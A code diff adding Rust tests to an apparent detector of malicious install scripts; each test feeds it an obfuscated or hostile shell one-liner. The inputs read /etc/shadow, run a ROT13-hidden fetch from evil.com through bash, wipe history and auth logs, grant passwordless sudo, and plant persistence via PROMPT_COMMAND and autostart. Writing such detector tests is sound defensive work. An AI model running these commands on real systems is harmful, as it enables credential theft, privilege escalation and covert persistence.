@@ -170,6 +170,56 @@ mod tests {
         assert!(has(&ids, "P-INSTALL-ENV-TOKENS"));
     }
 
+    // --- New obfuscation patterns ---
+
+    #[test]
+    fn install_ifs() {
+        let ids = analyze("cat${IFS}/etc/passwd");
+        assert!(has(&ids, "P-INSTALL-IFS"));
+    }
+
+    #[test]
+    fn install_ansi_c_hex() {
+        let ids = analyze("$'\\x63\\x61\\x74' /etc/shadow");
+        assert!(has(&ids, "P-INSTALL-ANSI-C-HEX"));
+    }
+
+    #[test]
+    fn install_rot13() {
+        let ids = analyze("echo 'phey uggc://rivy.pbz' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | bash");
+        assert!(has(&ids, "P-INSTALL-ROT13"));
+    }
+
+    #[test]
+    fn install_history_clear() {
+        let ids = analyze("unset HISTFILE; history -c");
+        assert!(has(&ids, "P-INSTALL-HISTORY-CLEAR"));
+    }
+
+    #[test]
+    fn install_log_clear() {
+        let ids = analyze("rm -rf /var/log/auth.log");
+        assert!(has(&ids, "P-INSTALL-LOG-CLEAR"));
+    }
+
+    #[test]
+    fn install_sudoers_mod() {
+        let ids = analyze("echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers");
+        assert!(has(&ids, "P-INSTALL-SUDOERS-MOD"));
+    }
+
+    #[test]
+    fn install_prompt_command() {
+        let ids = analyze("echo 'PROMPT_COMMAND=\"curl http://evil.com\"' >> ~/.bashrc");
+        assert!(has(&ids, "P-INSTALL-PROMPT-COMMAND"));
+    }
+
+    #[test]
+    fn install_xdg_autostart() {
+        let ids = analyze("cp malware.desktop ~/.config/autostart/");
+        assert!(has(&ids, "P-INSTALL-XDG-AUTOSTART"));
+    }
+
     #[test]
     fn benign_install_no_signals() {
         let ids = analyze(r#"
